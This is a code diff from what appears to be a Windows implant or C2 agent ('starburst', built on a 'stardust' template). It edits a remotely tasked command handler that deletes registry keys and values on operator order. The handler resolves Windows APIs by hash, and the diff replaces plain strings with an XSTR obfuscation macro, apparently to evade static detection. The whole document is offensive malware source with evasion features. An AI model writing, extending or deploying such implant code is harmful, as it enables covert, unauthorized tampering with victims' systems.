@@ -11,15 +11,15 @@ using namespace stardust;
 using namespace starburst;
 
 static auto declfn parse_hive_del( instance& inst, char* hive_str ) -> HKEY {
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKLM" ) ) ) == 0 ||
-         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_LOCAL_MACHINE" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKLM" ) ) == 0 ||
+         str_cmp( hive_str, XSTR( "HKEY_LOCAL_MACHINE" ) ) == 0 )
         return HKEY_LOCAL_MACHINE;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCU" ) ) ) == 0 ||
-         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_CURRENT_USER" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKCU" ) ) == 0 ||
+         str_cmp( hive_str, XSTR( "HKEY_CURRENT_USER" ) ) == 0 )
         return HKEY_CURRENT_USER;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCR" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKCR" ) ) == 0 )
         return HKEY_CLASSES_ROOT;
-    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKU" ) ) ) == 0 )
+    if ( str_cmp( hive_str, XSTR( "HKU" ) ) == 0 )
         return HKEY_USERS;
     return nullptr;
 }
@@ -41,7 +41,7 @@ auto declfn starburst::cmd_reg_delete(
 
     if ( !hive_str || hive_len == 0 || !key_str || key_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need hive and key" ) ) );
+            XSTR( "need hive and key" ) );
         return;
     }
 
@@ -56,7 +56,7 @@ auto declfn starburst::cmd_reg_delete(
     HKEY hive = parse_hive_del( inst, hive_buf );
     if ( !hive ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid hive" ) ) );
+            XSTR( "invalid hive" ) );
         return;
     }
 
@@ -67,7 +67,7 @@ auto declfn starburst::cmd_reg_delete(
             hive, key_buf, 0, KEY_SET_VALUE, &h_key );
         if ( status != ERROR_SUCCESS ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
+                XSTR( "RegOpenKeyExA failed" ) );
             return;
         }
 
@@ -78,7 +78,7 @@ auto declfn starburst::cmd_reg_delete(
         if ( !pRegDeleteValueA ) {
             inst.advapi32.RegCloseKey( h_key );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegDeleteValueA not found" ) ) );
+                XSTR( "RegDeleteValueA not found" ) );
             return;
         }
 
@@ -87,10 +87,10 @@ auto declfn starburst::cmd_reg_delete(
 
         if ( status == ERROR_SUCCESS ) {
             queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-                symbol<char*>( const_cast<char*>( "Value deleted" ) ) );
+                XSTR( "Value deleted" ) );
         } else {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegDeleteValueA failed" ) ) );
+                XSTR( "RegDeleteValueA failed" ) );
         }
     } else {
         // Delete a key
@@ -100,7 +100,7 @@ auto declfn starburst::cmd_reg_delete(
                 expr::hash_string( "RegDeleteKeyA" ) ) );
         if ( !pRegDeleteKeyA ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegDeleteKeyA not found" ) ) );
+                XSTR( "RegDeleteKeyA not found" ) );
             return;
         }
 
@@ -108,10 +108,10 @@ auto declfn starburst::cmd_reg_delete(
 
         if ( status == ERROR_SUCCESS ) {
             queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-                symbol<char*>( const_cast<char*>( "Key deleted" ) ) );
+                XSTR( "Key deleted" ) );
         } else {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegDeleteKeyA failed" ) ) );
+                XSTR( "RegDeleteKeyA failed" ) );
         }
     }
 }
